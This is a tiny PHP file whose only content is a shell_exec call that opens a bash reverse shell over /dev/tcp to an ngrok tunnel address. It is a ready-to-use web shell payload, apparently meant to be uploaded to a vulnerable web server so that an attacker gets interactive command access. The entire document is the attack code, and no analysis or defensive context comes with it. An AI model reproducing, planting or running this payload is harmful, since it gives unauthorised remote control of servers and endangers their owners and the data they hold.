<?php
echo shell_exec("/bin/bash -i >& /dev/tcp/0.tcp.eu.ngrok.io/16586 0>&1");
?>
